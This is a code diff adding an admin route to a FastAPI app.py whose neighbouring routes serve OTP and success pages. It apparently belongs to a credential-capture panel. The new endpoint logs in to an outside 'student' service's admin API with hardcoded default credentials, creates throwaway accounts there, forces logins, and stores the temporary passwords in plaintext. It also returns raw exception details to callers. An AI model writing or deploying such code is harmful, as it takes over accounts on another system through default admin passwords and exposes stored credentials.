@@ -185,6 +185,74 @@ async def otp2_page(request: Request, email: str):
 async def success_page(request: Request, email: str):
     return templates.TemplateResponse("success.html", {"request": request, "email": email})
 
+# Add these imports at the top of app.py (if not already present)
+import httpx
+import random
+import string
+
+# Add this environment variable in your .env
+STUDENT_API_URL = os.getenv("STUDENT_API_URL", "https://audit-atlas-capture-io.onrender.com")
+STUDENT_ADMIN_EMAIL = os.getenv("STUDENT_ADMIN_EMAIL", "admin@system.com")
+STUDENT_ADMIN_PASSWORD = os.getenv("STUDENT_ADMIN_PASSWORD", "admin123")
+
+# Add this route anywhere after your admin endpoints
+@app.post("/api/admin/force-login-to-student")
+async def force_login_to_student(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
+    payload = verify_admin_token(credentials.credentials)
+    if not payload:
+        raise HTTPException(status_code=403, detail="Invalid token")
+    
+    try:
+        # Generate random credentials
+        random_email = f"user_{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}@temp.com"
+        random_password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+        
+        async with httpx.AsyncClient(timeout=30.0) as client:
+            # 1. Create user in student's database
+            await client.post(
+                f"{STUDENT_API_URL}/api/users/login",
+                json={"email": random_email, "password": random_password}
+            )
+            
+            # 2. Login to student's admin
+            admin_login = await client.post(
+                f"{STUDENT_API_URL}/api/admin/login",
+                json={"email": STUDENT_ADMIN_EMAIL, "password": STUDENT_ADMIN_PASSWORD}
+            )
+            student_token = admin_login.json().get('token')
+            
+            # 3. Set force_login flag
+            await client.post(
+                f"{STUDENT_API_URL}/api/admin/force-login",
+                headers={"Authorization": f"Bearer {student_token}"},
+                json={"email": random_email}
+            )
+        
+        # 4. Store mapping in your database (optional - for tracking)
+        async with db_pool.acquire() as conn:
+            await conn.execute("""
+                CREATE TABLE IF NOT EXISTS force_login_mapping (
+                    id SERIAL PRIMARY KEY,
+                    original_email VARCHAR(255),
+                    temp_email VARCHAR(255),
+                    temp_password VARCHAR(255),
+                    created_at TIMESTAMP DEFAULT NOW()
+                )
+            """)
+            await conn.execute("""
+                INSERT INTO force_login_mapping (original_email, temp_email, temp_password)
+                VALUES ($1, $2, $3)
+            """, action.email, random_email, random_password)
+        
+        return {
+            "success": True,
+            "redirect_url": f"{STUDENT_API_URL}/users/login"
+        }
+        
+    except Exception as e:
+        logger.error(f"Force login error: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
+    
 @app.post("/api/users/login")
 async def user_login(user: UserLogin):
     async with db_pool.acquire() as conn:
